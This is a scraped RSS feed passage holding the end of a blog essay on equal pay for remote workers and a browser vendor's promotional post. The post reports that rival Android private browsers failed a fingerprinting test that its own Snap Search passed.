differently?</em></p><p>Companies like GitLab are pretty transparent about this. <a href="https://about.gitlab.com/handbook/total-rewards/compensation/#relocating">"Yes, you take a pay cut."</a></p><p><em>But what happens if I was living in a cheap city and decide to move to a more expensive one?</em></p><p>I asked the CEO of Gitlab. Here's what he replied -</p><figure><blockquote><p lang="en" dir="ltr">I don’t remember ever declining such a request.</p>— Sid Sijbrandij (@sytses) <a href="https://twitter.com/sytses/status/1264219857609912320?ref_src=twsrc%5Etfw">May 23, 2020</a></blockquote>

</figure><p>Coming from India, I know for a fact that a lot of people in lower-income countries will jump at this opportunity.</p><p><em>What happens if I choose to be a digital nomad changing cities every couple of months?</em></p><p><em>What if I choose to get an official address in some expensive city while I actually live in the suburbs?</em></p><h3 id="-4-loose-definition-of-cost-of-living">#4: Loose definition of "Cost of Living"</h3><p>The most common arguement against "equal pay for equal work" for remote employees is the difference in housing prices across cities/countries.</p><figure><blockquote><p lang="en" dir="ltr">But those COL adjustments are meant to reflect the local reality no (the house I live in here in SF will a lot cheaper in the middle of nowhere )? Assuming you have the same pool of money to pay people, how do you make sure people have the same experience regardless of place?</p>— Sriram Krishnan (@sriramk) <a href="https://twitter.com/sriramk/status/1263541004289753088?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>So, how do you define the "Cost of Living"?</p><p>Is it just the housing prices? And groceries? Restaurant bills, maybe?</p><p>That seems incomplete. It is only a small percentage of a lot of people's actual costs of living.</p><p>What about living with an elderly parent?</p><p>What about living a single life vs. being married? For that matter, how about having a stay-at-home spouse vs. having a spouse in a high-paying job?</p><p>What about the number of kids one has?</p><p>Number of dogs? Cats?</p><p><em>What's included in "Cost of Living"? </em></p><p><em>More importantly, who defines it? Should it be the employee who is actually incurring these costs? Or should it be the employer who is paying the employee?</em></p><figure><blockquote><div lang="en" dir="ltr"><p>If you’re going to pay people differentially based on where they choose to live, why not pay them differentially based on whether they have kids, too?</p><p>These little monsters are expensive, after all. I’ve got costs!</p></div>— Blair Reeves (@BlairReeves) <a href="https://twitter.com/BlairReeves/status/1263527961371738112?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><h3 id="other-tough-questions">Other tough questions</h3><ul><li><em>Who dictates the proportion in which I should be spending my money?</em></li></ul><p>Electronic devices from big brands are priced the same regardless of whether they are sold in the USA or Brazil. A Macbook would cost you the same every city of the world (except for the import duties that people outside the USA probably need to bear).</p><p>So, what if I choose to spend just 10% of my income on housing expenses and 30% surrounding myself with the latest tech gadgets from the world? And maybe another 40% investing in NASDAQ stocks?</p><p>It sure doesn't make sense to have a 100% of my salary reduced based on just 10% of my expenses.</p><ul><li><em>Where does the leadership in the company live? </em></li></ul><p>Leadership in companies that offer COL based compensation, often live and work in high-wage markets but they might feel differently if they were subject to lower pay for the same work.</p><ul><li><em>How do you account for the costs of reduced opportunities that employees, who don't live in primary talent markets, incur?</em></li></ul><p>People who don't live in the tech hubs of the world might have to bear costs in terms of reduced networking advantages and lesser alternate job opportunities.</p><hr><p>Unless a company is ready to give satisfactory answers to all such questions, it should default to equal pay for equal work.</p><figure><blockquote><div lang="en" dir="ltr"><p>Where you live is a consumption choice. We all make different choices based on what we like, and those are okay!</p><p>Just don’t penalize my compensation for your choices. Give me that bread! I’ve got a mortgage and a dog</p></div>— Blair Reeves (@BlairReeves) <a href="https://twitter.com/BlairReeves/status/1263285240098951168?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p><em>People doing the same jobs and providing the same value should be paid the same.</em></p><p>It is simple. It is fair.</p><p><strong>A COL employer</strong>: <em>"But it's unreal!"</em></p><p>Actually, no. A lot of remote companies are doing this already:</p><figure><blockquote><p lang="en" dir="ltr">Adding <a href="https://twitter.com/podia?ref_src=twsrc%5Etfw">@podia</a>, <a href="https://twitter.com/ConvertKit?ref_src=twsrc%5Etfw">@ConvertKit</a>, <a href="https://twitter.com/MeetEdgar?ref_src=twsrc%5Etfw">@MeetEdgar</a>, <a href="https://twitter.com/WhimsicalPowers?ref_src=twsrc%5Etfw">@WhimsicalPowers</a>, <a href="https://twitter.com/boundless_HQ?ref_src=twsrc%5Etfw">@boundless_HQ</a>, <a href="https://twitter.com/honeycombio?ref_src=twsrc%5Etfw">@honeycombio</a>, <a href="https://twitter.com/upstream_tech?ref_src=twsrc%5Etfw">@upstream_tech</a>, <a href="https://twitter.com/timeular?ref_src=twsrc%5Etfw">@timeular</a> to this list. Pumped to see that <a href="https://twitter.com/automattic?ref_src=twsrc%5Etfw">@automattic</a> and <a href="https://twitter.com/photomatt?ref_src=twsrc%5Etfw">@photomatt</a> are doing equal pay for equal work as well, which I wasn't aware of! 🙌 <a href="https://t.co/YKW3SekIZU">https://t.co/YKW3SekIZU</a></p>— Nick Francis (@nickfrancis) <a href="https://twitter.com/nickfrancis/status/1262837601762869248?ref_src=twsrc%5Etfw">May 19, 2020</a></blockquote>

</figure><h2 id="tough-questions-against-equal-pay-for-equal-work-and-my-answers-to-them">Tough questions against "equal pay for equal work" and my answers to them</h2><p>There are some really tough questions on the other side as well. I have been thinking about them for a while now. I'll take a stab at composing a reply to them.</p><h3 id="isn-t-it-against-market-economics-to-pay-people-living-in-different-cities-of-the-world-the-same-money">"Isn't it against market economics to pay people, living in different cities of the world, the same money?"</h3><p>No, it is not. </p><p>On the contrary, I believe that equal pay for equal work is the default market state. </p><p>I say this because we already see it in a lot of places -</p><ul><li>Freelancers have been living this way for a long time now. Create a name for yourself and work for clients in the US from a beach in Bali.</li><li>When you start a company, your customers pay you money regardless of where you live (unless your product's value is market-specific).</li><li>Writing a book, teaching an online course, paid newsletters and other forms of passive income don't earn the creator a subsidised income based on the city that she lives in. </li></ul><p>This is because we, as consumers, pay for the value that we get …</p></div></section></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.nityesh.com/equal-pay-for-equal-work-at-a-remote-company/">https://www.nityesh.com/equal-pay-for-equal-work-at-a-remote-company/</a></em></p>]]>
            </description>
            <link>https://www.nityesh.com/equal-pay-for-equal-work-at-a-remote-company/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134220</guid>
            <pubDate>Wed, 18 Nov 2020 08:03:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Android's Best Private Browser go through a simple test]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25134194">thread link</a>) | @CyberSkys
<br/>
November 17, 2020 | https://snapsearch.online/tips/androids-best-private-browsers-privacy-test/ | <a href="https://web.archive.org/web/*/https://snapsearch.online/tips/androids-best-private-browsers-privacy-test/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/promo-image.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/promo-image.png" alt="" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/promo-image.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-300x221.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-768x564.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_68/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-68x50.png 68w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-650x478.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-50x37.png 50w" data-sizes="(max-width: 1000px) 100vw, 1000px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/promo-image.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-300x221.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-768x564.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_68/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-68x50.png 68w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-650x478.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/promo-image-50x37.png 50w"></figure><p>When you think of Android’s Best Private Browsers, they consist of mostly the same apps. But are they really that good at maintaining your privacy? There might need to be a few changes made to these lists.</p><p>Let’s actually see how private Android’s Best Private Browsers really are. Let’s see how they stack up against Snap Search.</p> <h2>Android’s Best Private Browsers</h2><p>Here are the browsers we’re testing, and since this is our list, we’re keeping Snap Search on top:</p><ol><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=cybersky.snapsearch" target="_blank" rel="noreferrer noopener">Snap Search</a></li><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=org.mozilla.focus" target="_blank" rel="noreferrer noopener nofollow">Firefox Focus</a></li><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=com.duckduckgo.mobile.android" target="_blank" rel="noreferrer noopener nofollow">DuckDuck Go</a></li><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=com.brave.browser" target="_blank" rel="noreferrer noopener nofollow">Brave</a></li><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=com.vivaldi.browser" target="_blank" rel="noreferrer noopener nofollow">Vivaldi</a></li><li><a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=com.epic.browser" target="_blank" rel="noreferrer noopener nofollow">Epic</a></li></ol><h2>The Test</h2><p>We came across this really cool test at <a aria-label="undefined (opens in a new tab)" href="https://www.nothingprivate.ml/" target="_blank" rel="noreferrer noopener">https://www.nothingprivate.ml/</a> which basically takes one input. If your browser is secure/private – that input should <strong><em>not</em></strong> be remembered in a different session/tab/window/incognito mode etc.</p><h2>Disclaimer</h2><ul><li>For browsers such as DuckDuckGo and FireFox, which had special options to clear/burn all history and data, we used them in the test.</li><li>Brave and Vivaldi did not allow taking screenshots in the Incognito Mode, so we’ve taken screenshots in the normal mode but you can try it out in any mode you want, even mix it up.</li><li>We tried with restarting each browser too, hoping that would at least help pass this.</li><li>Please feel free to try it again with any browser any way you like. Let us know if you find other results.</li></ul><h2>Let’s get into it!</h2><h3>Firefox Focus</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png" alt="Firefox privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-50x22.png 50w"><figcaption>Firefox Focus Failed</figcaption></figure><p>Launched as the super privacy focused version of Firefox, which is anyways popular for being private. They failed even after using the clear &amp; restart option in the app.</p><h3>Duck Duck Go</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1024x448.png" alt="DuckDuckGo privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/duckduckgo_test_fail-50x22.png 50w"><figcaption>DuckDuckGo Failed</figcaption></figure><p>The pioneers in online privacy, the popular browser of a very popular search engine has a ‘burn’ option that destroys all past browsing, history, cookies, cache etc. Still did not work.</p><h3>Brave Browser</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1024x448.png" alt="brave browser privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/brave_test_fail-50x22.png 50w"><figcaption>Brave Failed</figcaption></figure><p>An incredibly popular privacy option. They failed to forget the stored data irrespective of normal/incognito mode or browser restarts.</p><h3>Vivaldi Browser</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1024x448.png" alt="Vivaldi privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/vivaldi_test_fail-50x22.png 50w"><figcaption>Vivaldi Failed</figcaption></figure><p>No luck with Vivaldi! They too could not pass this simple privacy test. Like others, tried all possible options.</p><h3>Epic Browser</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1024x448.png" alt="epic privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/epic_test_fail-50x22.png 50w"><figcaption>Epic failed</figcaption></figure><p>No luck here too. Epic Browser even has an inbuilt proxy – which, unfortunately, was still not enough to keep the browsing activity secure.</p><h3>Snap Search</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1024x448.png" alt="Snap Search privacy pass" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/snapsearch_test_pass-300x131.png 300w, 